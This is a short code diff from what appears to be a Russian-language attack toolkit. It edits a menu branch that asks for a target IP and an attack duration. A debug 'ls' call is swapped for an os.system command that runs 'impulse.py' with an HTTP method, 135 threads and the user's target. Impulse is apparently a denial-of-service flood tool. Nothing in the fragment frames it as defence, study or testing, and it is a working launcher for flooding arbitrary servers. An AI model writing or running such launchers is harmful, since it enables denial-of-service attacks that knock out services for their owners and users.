@@ -158,8 +158,7 @@ sa  - - afhe
             try:
                 target=input('\nIP: ')
                 time_atack=input('время атаки в секундах: ')
-                os.system('ls')
-#                os.system(r'cd &cd voron & cd Impusle & python impulse.py --method HTTP --target '+str(target)+' --time '+str(time_atack)+' --threads 135')
+                os.system(r'cd Impusle & python impulse.py --method HTTP --target '+str(target)+' --time '+str(time_atack)+' --threads 135')
             except:
                 print('Ковальски, у нас ошибка.')
         else:
